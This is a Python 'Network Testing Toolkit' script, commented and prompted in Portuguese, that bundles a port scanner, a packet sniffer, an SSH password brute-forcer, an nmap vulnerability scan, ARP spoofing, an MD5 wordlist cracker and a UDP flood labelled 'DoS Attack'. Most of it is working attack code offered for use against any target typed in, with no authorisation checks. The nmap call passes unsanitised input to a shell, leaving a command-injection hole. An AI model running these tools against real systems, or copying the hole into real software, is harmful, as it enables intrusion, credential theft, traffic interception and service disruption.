import warnings

warnings.filterwarnings('ignore')

import pyfiglet
import socket
import os
import re
from concurrent.futures import ThreadPoolExecutor
from scapy.all import sniff, ARP, send, srp, Ether
import hashlib
import paramiko
from tqdm import tqdm
import time


def show_banner(title):
    banner = pyfiglet.figlet_format(title)
    print(banner)


def menu():
    options = [
        "[1] Port Scanner",
        "[2] Network Sniffer",
        "[3] Brute Force Attack",
        "[4] Vulnerability Scanner",
        "[5] ARP Spoofing",
        "[6] Password Cracker",
        "[7] DoS Attack",
        "[8] Exit"
    ]
    print("\n".join(options))


def is_valid_ip_or_hostname(target):
    """Validate if the input is a valid IP address or hostname."""
    try:
        socket.gethostbyname(target)
        return True
    except socket.error:
        return False


def is_valid_port(port):
    """Validate if the input is a valid port number."""
    return port.isdigit() and 1 <= int(port) <= 65535


def scan_port(target, port):
    """Scan a specific port on the target."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)  # Timeout para evitar longas esperas
            result = sock.connect_ex((target, port))
            return port, result == 0
    except socket.error:
        return port, False


def port_scanner(target, ports):
    """Scan multiple ports on the target with a progress bar."""
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda port: scan_port(target, port),
                               tqdm(ports, desc="Scanning Ports", unit="port", total=len(ports)))

    for port, is_open in results:
        if is_open:
            open_ports.append(port)
    return open_ports


def run_port_scanner():
    show_banner("Port Scanner")
    target = input("Digite o IP, host ou FQDN para escanear: ")
    if not is_valid_ip_or_hostname(target):
        print("Endereço inválido. Por favor, insira um IP, host ou FQDN válido.")
        return

    ports = range(1, 1025)  # Reduzido para testes (pode ajustar conforme necessário)
    print(f"Escaneando {target} para portas abertas...")

    try:
        start_time = time.time()
        open_ports = port_scanner(target, ports)
        duration = time.time() - start_time

        if open_ports:
            print(f"Portas abertas em {target}: {', '.join(map(str, open_ports))}")
        else:
            print("Nenhuma porta aberta encontrada.")
        print(f"Scan concluído com sucesso em {duration:.2f} segundos.")
    except KeyboardInterrupt:
        print("\nEscaneamento interrompido pelo usuário.")


def packet_handler(packet):
    """Handle captured packets."""
    print(packet.summary())


def run_network_sniffer():
    show_banner("Network Sniffer")
    interface = input("Digite a interface para escutar (ex. eth0): ")
    ipv6 = input("Deseja capturar pacotes IPv6? (s/n): ").strip().lower() == 's'
    filter_expr = input("Digite um filtro opcional (ex. 'tcp port 80') ou deixe em branco para nenhum filtro: ")

    # Definindo o filtro para IPv6 ou IPv4
    if ipv6:
        filter_expr = "ip6 " + filter_expr
    else:
        filter_expr = "ip " + filter_expr

    print(f"Capturando pacotes na interface {interface}...")

    try:
        # Usar sniff com timeout e loop contínuo
        sniff(iface=interface, prn=packet_handler, filter=filter_expr if filter_expr else None, timeout=60)
    except KeyboardInterrupt:
        print("\nCaptura de pacotes interrompida pelo usuário.")
    print("Captura de pacotes concluída com sucesso.")


def ssh_brute_force(target, username, password_list):
    """Perform SSH brute force attack."""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    found_password = None
    try:
        for password in tqdm(password_list, desc="Tentando senhas", unit="password", total=len(password_list)):
            try:
                ssh_client.connect(target, username=username, password=password, timeout=3)
                found_password = password
                break
            except paramiko.AuthenticationException:
                pass  # Senha incorreta, continuar tentando
            except Exception as e:
                print(f"Erro: {str(e)}")
                break

        if found_password:
            print(f"Senha encontrada: {found_password}")
        else:
            print("Nenhuma senha encontrada.")
    except KeyboardInterrupt:
        print("\nAtaque de força bruta interrompido pelo usuário.")
    finally:
        ssh_client.close()
    print("Ataque de força bruta concluído.")


def run_brute_force_attack():
    show_banner("Brute Force Attack")
    target = input("Digite o IP, host ou FQDN para ataque SSH: ")
    if not is_valid_ip_or_hostname(target):
        print("Endereço inválido. Por favor, insira um IP, host ou FQDN válido.")
        return

    username = input("Digite o nome de usuário: ")
    passwords = input("Digite as senhas para testar (separadas por vírgula): ").split(',')
    ssh_brute_force(target, username, passwords)


def run_vulnerability_scanner():
    show_banner("Vulnerability Scanner")
    target = input("Digite o IP, host ou FQDN para escanear vulnerabilidades: ")
    if not is_valid_ip_or_hostname(target):
        print("Endereço inválido. Por favor, insira um IP, host ou FQDN válido.")
        return

    print(f"Executando scan de vulnerabilidades em {target}...")

    try:
        os.system(f"nmap -sV --script=vuln {target}")
    except KeyboardInterrupt:
        print("\nScan de vulnerabilidades interrompido pelo usuário.")
    print("Scan de vulnerabilidades concluído com sucesso.")


def arp_spoof(target, spoof_ip):
    """Perform ARP spoofing."""
    packet = ARP(op=2, pdst=target, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"ARP spoofing: {spoof_ip} se passando por {target}.")


def restore_arp(target, gateway_ip):
    """Restore the ARP table to its original state."""
    packet = ARP(op=2, pdst=target, psrc=gateway_ip, hwsrc="00:00:00:00:00:00", hwdst="FF:FF:FF:FF:FF:FF")
    send(packet, count=5, verbose=False)
    print(f"Restaurando ARP para {target}.")


def run_arp_spoofing():
    show_banner("ARP Spoofing")
    target = input("Digite o IP alvo: ")
    spoof_ip = input("Digite o IP para se passar: ")
    if not is_valid_ip_or_hostname(target) or not is_valid_ip_or_hostname(spoof_ip):
        print("Endereço inválido. Por favor, insira um IP ou FQDN válido.")
        return

    print(f"Executando ARP spoofing contra {target} se passando por {spoof_ip}...")

    try:
        arp_spoof(target, spoof_ip)
        restore = input("Deseja restaurar a tabela ARP para o estado original? (s/n): ").strip().lower()
        if restore == 's':
            restore_arp(target, spoof_ip)
    except KeyboardInterrupt:
        print("\nARP spoofing interrompido pelo usuário.")
    print("ARP spoofing concluído com sucesso.")


def password_cracker(hash_to_crack, wordlist):
    """Crack an MD5 hash using a wordlist with progress."""
    try:
        with open(wordlist, 'r') as file:
            words = file.readlines()
            found_password = None
            for word in tqdm(words, desc="Quebrando senha", unit="word", total=len(words)):
                word = word.strip()
                if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
                    found_password = word
                    break
        if found_password:
            print(f"Senha encontrada: {found_password}")
        else:
            print("Senha não encontrada no wordlist.")
    except KeyboardInterrupt:
        print("\nQuebra de senha interrompida pelo usuário.")
    except Exception as e:
        print(f"Erro ao executar o Password Cracker: {str(e)}")
    print("Quebra de senha concluída.")


def run_password_cracker():
    show_banner("Password Cracker")
    hash_to_crack = input("Digite o hash MD5 para quebrar: ")
    wordlist = input("Digite o caminho do arquivo wordlist: ")
    password_cracker(hash_to_crack, wordlist)


def dos_attack(target, port):
    """Perform a DoS attack with a progress bar."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target, port))
    print("Iniciando DoS Attack... Pressione Ctrl+C para parar.")

    try:
        for _ in tqdm(range(1000000), desc="Enviando pacotes", unit="packet"):
            client.send(b'FLOOD')
            time.sleep(0.01)  # Simula a duração entre pacotes
    except KeyboardInterrupt:
        print("\nAtaque DoS interrompido pelo usuário.")
    print("Ataque DoS concluído.")


def run_dos_attack():
    show_banner("DoS Attack")
    target = input("Digite o IP, host ou FQDN alvo para DoS: ")
    if not is_valid_ip_or_hostname(target):
        print("Endereço inválido. Por favor, insira um IP, host ou FQDN válido.")
        return

    port = input("Digite a porta para ataque: ")
    if not is_valid_port(port):
        print("Porta inválida. Por favor, insira um número de porta válido (1-65535).")
        return

    print(f"Executando ataque DoS contra {target}:{port}...")
    dos_attack(target, int(port))


def main():
    show_banner("Network Testing Toolkit")
    while True:
        menu()
        choice = input("Selecione uma opção: ")
        if choice == '1':
            run_port_scanner()
        elif choice == '2':
            run_network_sniffer()
        elif choice == '3':
            run_brute_force_attack()
        elif choice == '4':
            run_vulnerability_scanner()
        elif choice == '5':
            run_arp_spoofing()
        elif choice == '6':
            run_password_cracker()
        elif choice == '7':
            run_dos_attack()
        elif choice == '8':
            print("Saindo...")
            break
        else:
            print("Opção inválida. Tente novamente.")


if __name__ == "__main__":
    main()
